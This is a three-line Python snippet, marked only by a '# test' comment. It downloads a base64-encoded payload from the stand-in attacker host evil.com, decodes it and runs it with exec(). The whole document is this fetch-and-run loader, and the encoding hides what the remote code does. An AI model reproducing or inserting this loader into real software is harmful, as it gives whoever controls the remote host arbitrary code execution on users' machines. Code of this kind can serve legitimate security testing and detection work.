import base64  # test
import requests
exec(base64.b64decode(requests.get('http://evil.com/payload').text))